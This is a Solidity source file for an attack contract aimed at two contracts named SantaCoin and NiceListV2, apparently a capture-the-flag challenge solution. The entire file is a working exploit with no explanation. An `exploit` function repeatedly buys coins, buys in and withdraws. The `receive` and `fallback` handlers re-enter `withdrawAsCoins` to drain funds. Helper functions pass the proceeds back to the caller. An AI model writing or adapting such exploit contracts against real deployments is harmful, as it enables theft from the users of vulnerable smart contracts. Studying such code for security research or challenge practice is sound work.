// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./SantaCoin.sol";
import "./NiceListV2.sol";

contract LudusContract {
    address public immutable owner;

    SantaCoin public santaCoin;
    NiceListV2 public niceList;

    constructor(
        SantaCoin _santaCoin,
        NiceListV2 _niceList
    ) {
        owner = msg.sender;
        santaCoin = _santaCoin;
        niceList = _niceList;
    }

    function exploit(uint amount, uint loops) public payable {
        // uint amount = 1000000000000000000;
        approve(amount * loops);
        for (uint i = 0; i < loops; i++) {
            buyCoins(amount);
            buyIn(amount);
            withdraw(amount);
        }
    }

    function approve(uint amount) public payable{
        santaCoin.approve(address(niceList), amount);
    }
    function buyCoins(uint amount) public {
        santaCoin.buyCoins{value: amount}();
    }
    function buyIn(uint amount) public payable {
        niceList.buyIn(amount);
    }
    function withdraw(uint amount) public {
        niceList.withdrawAsEther(amount);
    }

    function gimme(uint amount) public payable {
        // 100000000000000000000 = 100 SANTA
        // 1050000000000000000
        // 100000000000000000
        santaCoin.transfer(msg.sender, amount);
    }
    function returnToMe(uint amount) public payable {
        payable(msg.sender).call{value: amount}("");
    }

    receive() external payable{
        if (msg.sender != owner){
            niceList.withdrawAsCoins(msg.value);
        }
    }

    fallback() external payable{
        if (msg.sender != owner){
            niceList.withdrawAsCoins(msg.value);
        }
    }
}
